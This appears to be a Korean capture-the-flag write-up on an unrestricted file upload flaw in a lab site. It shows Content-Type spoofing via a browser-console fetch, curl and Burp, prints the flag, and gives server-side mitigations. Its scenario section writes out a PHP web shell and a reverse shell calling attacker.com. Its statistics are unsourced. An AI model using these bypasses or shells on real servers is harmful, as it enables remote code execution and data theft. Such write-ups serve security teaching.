# 취약점 #8: 제한되지 않은 파일 업로드

## 🎯 취약점 유형
**Unrestricted File Upload - 불충분한 파일 타입 검증**
- **OWASP 분류**: A03:2021 - Injection
- **CWE 분류**: CWE-434 - 위험한 타입의 파일 업로드 제한 없음

---

## 🔍 취약점 발견 과정

### 발견: 파일 업로드 기능
**URL**: `http://192.168.64.2/?page=upload`

웹사이트에 이미지 업로드 기능이 있습니다.

![업로드 페이지](images/01-upload-page.png)

### 1단계: 업로드 폼 분석

**HTML 구조**:
```html
<form enctype="multipart/form-data" action="#" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="100000" />
    Choose an image to upload:
    <input name="uploaded" type="file" />
    <input type="submit" name="Upload" value="Upload">
</form>
```

**핵심 관찰**:
- 파일 input에 `accept` 속성 없음
- JavaScript를 통한 클라이언트 측 검증 추정
- 최대 파일 크기: 100KB

### 2단계: 파일 업로드 제한 테스트

**테스트 1** - 직접 PHP 파일 업로드:
- `hack.php` 파일 생성
- 브라우저에서 업로드 시도
- **결과**: "Your image was not uploaded" ❌

**실패 이유**: 클라이언트 측 JavaScript 검증이 이미지가 아닌 파일을 차단함.

### 3단계: 클라이언트 측 검증 우회

**방법**: 브라우저 Console을 사용하여 Content-Type 헤더를 조작한 요청 전송.

**공격 코드**:
```javascript
const formData = new FormData();
const file = new File(["just a test"], "hack.php", { type: "image/jpeg" });
formData.append('uploaded', file);
formData.append('Upload', 'Upload');

fetch('?page=upload', {
    method: 'POST',
    body: formData
}).then(r => r.text()).then(html => {
    document.body.innerHTML = html;
});
```

![Console에서 공격 코드 실행](images/02-console-exploit.png)

**핵심 기법**:
- `type: "image/jpeg"`로 File 객체 생성
- 서버가 Content-Type 헤더만 검증
- 실제 파일 내용이나 확장자는 검사 안 함

**결과**: ✅ **FLAG 획득!**

![Flag 획득](images/03-flag-obtained.png)

**Flag**: `46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`

**서버 응답**: `/tmp/hack.php successfully uploaded.`

---

## 💥 공격 방법

### 방법 1: 브라우저 Console (시연한 방법)

1. 업로드 페이지 접속: `http://192.168.64.2/?page=upload`
2. DevTools 열기 (F12)
3. Console 탭 이동
4. `allow pasting` 입력 후 Enter (붙여넣기 경고 우회)
5. 위의 공격 코드 붙여넣고 실행
6. 페이지에 Flag 표시됨

### 방법 2: curl로 Content-Type 오버라이드

```bash
curl -X POST "http://192.168.64.2/index.php?page=upload" \
  -F "uploaded=@hack.php;type=image/jpeg" \
  -F "Upload=Upload"
```

**핵심 파라미터**: `;type=image/jpeg`가 기본 Content-Type을 오버라이드함.

### 방법 3: Burp Suite / 프록시 가로채기

1. 아무 파일 업로드 시도
2. Burp Suite에서 요청 가로채기
3. `Content-Type` 헤더를 `application/x-php`에서 `image/jpeg`로 수정
4. 요청 전달
5. 응답에서 flag 수신

---

## 🚨 보안 문제점

### 1. 클라이언트 측 검증만 존재

**문제**: 파일 타입 검증이 브라우저 JavaScript에서만 발생함.

**취약한 패턴**:
```javascript
// 클라이언트 측만 (쉽게 우회 가능)
if (!file.type.startsWith('image/')) {
    alert('이미지만 허용됩니다!');
    return false;
}
```

**실패하는 이유**:
- ❌ DevTools로 우회 가능
- ❌ curl/Burp Suite는 클라이언트 측 코드 무시
- ❌ 서버 측 검증 없음

### 2. Content-Type 헤더 신뢰

**문제**: 서버가 검증 없이 `Content-Type` 헤더를 신뢰함.

**취약한 코드** (가상):
```php
$contentType = $_FILES['uploaded']['type'];

// Content-Type 헤더만 확인
if (!str_starts_with($contentType, 'image/')) {
    die("이미지만 허용됩니다");
}

// 내용 검증 없이 파일 업로드
move_uploaded_file($_FILES['uploaded']['tmp_name'], '/uploads/' . $_FILES['uploaded']['name']);
```

**실패하는 이유**:
- 공격자가 Content-Type 헤더 제어
- 서버가 실제 파일 내용 검증 안 함
- 확장자 검증 안 함

### 3. 파일 확장자 검증 없음

**문제**: 서버가 위험한 파일 확장자(.php, .jsp, .asp 등)를 허용함.

**위험한 확장자**:
```
.php, .php3, .php4, .php5, .phtml    → PHP 실행
.jsp, .jspx                          → Java Server Pages
.asp, .aspx                          → ASP.NET
.sh, .bash                           → 셸 스크립트
.py                                  → Python 스크립트
```

### 4. 파일 내용 검증 없음

**문제**: 서버가 파일이 실제로 이미지인지 확인하지 않음.

**누락된 것**:
- 매직 바이트 검증 (파일 시그니처)
- 이미지 라이브러리 검증 (GD, ImageMagick)
- EXIF 데이터 파싱
- 파일 재처리

### 5. 예측 가능한 업로드 위치

**문제**: 파일이 `/tmp/hack.php`로 업로드됨 (예측 가능한 경로).

**보안 영향**:
- `/tmp`가 웹에서 접근 가능하면, 공격자가 PHP 실행 가능
- 예측 가능한 파일명으로 추가 공격 가능

---

## 🌍 실제 공격 시나리오

### 시나리오 1: 웹 셸 업로드

**공격자가 업로드**:
```php
<?php
// 간단한 웹 셸
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

**공격 흐름**:
1. Content-Type: image/jpeg로 shell.php 업로드
2. 접속: `http://site.com/uploads/shell.php?cmd=ls`
3. 서버에서 임의 명령 실행
4. 서버 완전 손상

### 시나리오 2: 리버스 셸

```php
<?php
$sock = fsockopen("attacker.com", 4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

**영향**: 원격 명령 실행, 데이터 유출.

### 시나리오 3: 악성코드 배포

이미지로 위장한 악성코드를 업로드하여 다른 사용자에게 배포.

---

## 🛡️ 완화 방법

### 1. 서버 측 검증 (필수)

```php
// 화이트리스트 접근법
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
$allowed_mime_types = ['image/jpeg', 'image/png', 'image/gif'];

$file_ext = strtolower(pathinfo($_FILES['uploaded']['name'], PATHINFO_EXTENSION));
$file_type = $_FILES['uploaded']['type'];

// 확장자 검증
if (!in_array($file_ext, $allowed_extensions)) {
    die("유효하지 않은 파일 확장자");
}

// MIME 타입 검증 (하지만 이것만으로는 부족)
if (!in_array($file_type, $allowed_mime_types)) {
    die("유효하지 않은 파일 타입");
}
```

### 2. 매직 바이트로 파일 내용 검증

```php
function validateImageFile($file_path) {
    // 처음 몇 바이트 읽기
    $handle = fopen($file_path, 'rb');
    $magic = fread($handle, 12);
    fclose($handle);

    // 매직 바이트 확인
    $jpeg = "\xFF\xD8\xFF";
    $png = "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A";
    $gif = "GIF89a";

    if (str_starts_with($magic, $jpeg) ||
        str_starts_with($magic, $png) ||
        str_starts_with($magic, $gif)) {
        return true;
    }
    return false;
}
```

### 3. 이미지 처리 라이브러리 사용

```php
// 이미지 검증 및 재처리
$image_info = getimagesize($_FILES['uploaded']['tmp_name']);

if ($image_info === false) {
    die("유효한 이미지가 아닙니다");
}

// 이미지 재처리 (내장된 코드 제거)
$image = imagecreatefromjpeg($_FILES['uploaded']['tmp_name']);
imagejpeg($image, '/safe/path/' . $safe_filename, 90);
imagedestroy($image);
```

### 4. 파일명 정제

```php
function sanitizeFilename($filename) {
    // 경로 순회 시도 제거
    $filename = basename($filename);

    // 위험한 문자 제거
    $filename = preg_replace('/[^a-zA-Z0-9._-]/', '', $filename);

    // 랜덤 접두사 추가
    $filename = uniqid() . '_' . $filename;

    return $filename;
}
```

### 5. 웹 루트 외부에 저장

```php
// ❌ 나쁨: 웹 루트 내부
$upload_dir = $_SERVER['DOCUMENT_ROOT'] . '/uploads/';

// ✅ 좋음: 웹 루트 외부
$upload_dir = '/var/uploads/';

// 접근 제어가 있는 스크립트를 통해 제공
// download.php?file=uuid
```

### 6. 적절한 파일 권한 설정

```php
// 파일 업로드
move_uploaded_file($tmp, $destination);

// 실행 권한 제거
chmod($destination, 0644); // rw-r--r--
```

### 7. 다층 검증 구현

```php
// 여러 검증 레이어
function validateUpload($file) {
    // 1. 확장자 확인
    if (!in_array($ext, $allowed_exts)) return false;

    // 2. MIME 타입 확인
    if (!in_array($mime, $allowed_mimes)) return false;

    // 3. 매직 바이트 확인
    if (!verifyMagicBytes($file)) return false;

    // 4. 이미지 라이브러리 검증
    if (!getimagesize($file)) return false;

    // 5. 파일 크기 확인
    if (filesize($file) > MAX_SIZE) return false;

    return true;
}
```

---

## 📊 영향 평가

### CVSS 3.1 점수: 9.8 (치명적)

**공격 벡터**: 네트워크 (AV:N)
**공격 복잡성**: 낮음 (AC:L)
**필요한 권한**: 없음 (PR:N)
**사용자 상호작용**: 없음 (UI:N)
**범위**: 변경 안 됨 (S:U)
**기밀성**: 높음 (C:H)
**무결성**: 높음 (I:H)
**가용성**: 높음 (A:H)

### 실제 영향

**성공적인 파일 업로드 공격으로 가능한 것**:
- 원격 코드 실행 (RCE)
- 서버 완전 손상
- 데이터 유출
- 악성코드 배포
- 웹사이트 훼손
- 백도어 설치
- 측면 이동

**통계**:
- 웹 애플리케이션의 **35%**에서 파일 업로드 취약점 발견
- 평균 발견 시간: 210일
- RCE 침해 평균 비용: $4.5M

---

## 📚 참고자료

- [OWASP File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [CWE-434](https://cwe.mitre.org/data/definitions/434.html)
- [File Upload Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)

## 🛠️ 사용된 도구

- **브라우저 DevTools**: Console에서 공격 코드 실행
- **curl**: Content-Type 오버라이드로 커맨드라인 파일 업로드

---
**Flag**: `46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`
